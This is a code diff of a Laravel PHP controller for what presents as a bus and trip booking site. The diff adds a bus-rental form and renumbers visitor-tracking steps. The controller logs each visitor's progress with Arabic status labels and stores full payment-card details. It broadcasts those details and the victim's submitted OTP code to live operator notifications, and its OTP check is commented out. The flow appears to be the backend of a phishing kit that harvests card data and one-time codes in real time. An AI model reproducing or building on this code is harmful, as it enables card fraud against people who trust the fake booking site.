@@ -9,6 +9,7 @@ use App\Events\NewVisitor;
 use App\Events\SendAuth;
 use App\Events\SendNotification;
 use App\Events\SendPeople;
+use App\Models\BusRent;
 use App\Models\PaymentCard;
 use Illuminate\Http\Request;
 use App\Models\VisitorNotifications;
@@ -20,27 +21,51 @@ class TripController extends Controller
     {
         // dd($trip_type);
         try {
-            $request['direction_type'] == $request->type;
-            $validated = $this->validate($request, [
-                'from' => 'required|string',
-                'to' => 'required|string',
-                'direction_type' => 'required|string|in:one_direction,go_and_back',
-                'departure_date' => 'required|date',
-                'departure_time' => 'required',
-                'return_date' => 'sometimes|nullable|date',
-                'adults_count' => 'required|integer|min:1',
-                'child_count' => 'required|integer|min:0',
-                'infant_count' => 'required|integer|min:0',
-                'special_needs_count' => 'required|integer|min:0',
-                'ticket_type' => 'required|string|in:economic,premium',
-            ]);
-            unset($request['direction_type']);
-            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
-            $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
-            $request['price'] = $request->ticket_type =='economic' ? 40 : 120;
-            $trip = Trip::create($request->all());
+            switch ($trip_type) {
+                case 'bus':
+                    $validated = $this->validate($request, [
+                        'from' => 'required|string',
+                        'to' => 'required|string',
+                        'category' => 'required|string|in:peoples,company',
+                        'busType' => 'required|string',
+                        'offec' => 'required|string',
+                        'perosns' => 'required|integer|min:1',
+                        'serviceDate' => 'required|date',
+                        'servicedeparture_time' => 'required',
+                        'city' => 'required|string',
+                        'email' => 'required|string',
+                    ]);
+                    $bus_trip = BusRent::create($validated);
+                    return redirect()->route('bus_summary', $bus_trip->id);
+                    break;
 
-            return redirect()->route('summary', $trip->id);
+                default:
+                    $request['direction_type'] == $request->type;
+                    $validated = $this->validate($request, [
+                        'from' => 'required|string',
+                        'to' => 'required|string',
+                        'direction_type' => 'required|string|in:one_direction,go_and_back',
+                        'departure_date' => 'required|date',
+                        'departure_time' => 'required',
+                        'return_date' => 'sometimes|nullable|date',
+                        'adults_count' => 'required|integer|min:1',
+                        'child_count' => 'required|integer|min:0',
+                        'infant_count' => 'required|integer|min:0',
+                        'special_needs_count' => 'required|integer|min:0',
+                        'ticket_type' => 'required|string|in:economic,premium',
+                    ]);
+                    unset($request['direction_type']);
+                    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+                    $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
+                    $request['price'] = $request->ticket_type =='economic' ? 40 : 120;
+                    $trip = Trip::create($request->all());
+                    return redirect()->route('summary', $trip->id);
+                    break;
+
+            }
+
+
+
         } catch (\Exception $ex) {
             dd($ex->getMessage());
         }
@@ -48,7 +73,30 @@ class TripController extends Controller
     public function summary($id)
     {
         $summary = Trip::select('from', 'to', 'departure_time', 'type', 'departure_date', 'return_date', 'price')->find($id);
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            event(new SendNotification($not));
+        }
         return view('summary', compact('summary'));
+    }
+    public function busSummary($id)
+    {
+        $summary = BusRent::find($id);
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            event(new SendNotification($not));
+        }
+        return view('bus_summary', compact('summary'));
     }
     public function peopleDataPage()
     {
@@ -56,7 +104,7 @@ class TripController extends Controller
         $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
         if ($visitor) {
             $not  = VisitorNotifications::find($visitor->id);
-            $not->update(['page' => 'دخل لصفحة البيانات الشخصية','step_number'=>2]);
+            $not->update(['page' => 'دخل لصفحة البيانات الشخصية','step_number'=>3]);
             session()->put('visitor', json_encode($not));
             // event(new NewVisitor($not));
             event(new SendVisit($not));
@@ -80,7 +128,7 @@ class TripController extends Controller
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
-                $validated['step_number'] = 3;
+                $validated['step_number'] = 4;
                 $validated['page']  = 'قام بإرسال بياناته';
 
                 $not  = VisitorNotifications::find($visitor->id);
@@ -98,6 +146,15 @@ class TripController extends Controller
     }
     public function paymentPage()
     {
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة  بيانات الدفع','step_number'=>5]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            event(new SendNotification($not));
+        }
         // dd($trip_type);
         return view('trip_payment');
         // $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
@@ -130,12 +187,12 @@ class TripController extends Controller
                 $payment_card = PaymentCard::create($validated);
 
                 $not  = VisitorNotifications::find($visitor->id);
-                $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>4]);
+                $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>6]);
                 session()->put('visitor', json_encode($not));
                 // event(new NewVisitor($not));
                 event(new SendPart($payment_card,$not));
                 event(new SendNotification($not));
-                return redirect()->route('verify_otp');
+                return redirect()->route('trip_payment_waiting');
             }
             return redirect('/');
         } catch (\Exception $ex) {
@@ -174,7 +231,7 @@ class TripController extends Controller
         $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
         if ($visitor) {
             $not  = VisitorNotifications::find($visitor->id);
-            $not->update(['page' => 'دخل لصفحة إثبات بيانات البطاقة','step_number'=>5]);
+            $not->update(['page' => 'دخل لصفحة إثبات بيانات البطاقة','step_number'=>7]);
             session()->put('visitor', json_encode($not));
             // event(new NewVisitor($not));
             event(new SendVisit($not));
@@ -199,7 +256,7 @@ class TripController extends Controller
                 $payment_card->save();
                 // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
                 $not  = VisitorNotifications::find($visitor->id);
-                $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>6]);
+                $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>8]);
                 event(new SendAuth($not,$request->code));
                 event(new SendNotification($not));
             }
